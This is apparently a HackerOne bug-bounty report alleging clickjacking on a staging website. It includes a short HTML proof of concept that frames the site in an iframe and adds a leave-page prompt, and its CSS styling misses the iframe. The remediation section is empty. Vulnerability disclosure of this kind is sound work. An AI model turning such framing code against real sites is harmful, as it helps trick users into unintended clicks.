# HackerOne Report: Clickjacking at https://staging.uzbey.com/
**Report ID:** 17315
**Vulnerability Class:** UI Redressing (Clickjacking)

## Vulnerability Information & PoC
hi, i found your site is vulnerable to clickjacking.
poc:    
<html><head>
<title>  testing </title>
<style>

frame {

opacity: 0.5;
border: none;
position: absolute;
top: 0px;
left: 0px;
z-index: 1000;
}
</style>
</head>
<body>
<script>
   window.onbeforeunload = function()
   {
      return " Do you want to leave ?";
   }
</script>
<p> site is vulnerable for Clickjacking! by Vineet bhardwaj</p>
<iframe id="frame" width="100%" height="100%" src="https://staging.uzbey.com/"></iframe>
</body>
</html>


please check the attachment ...



## Discussion & Remediation Timeline
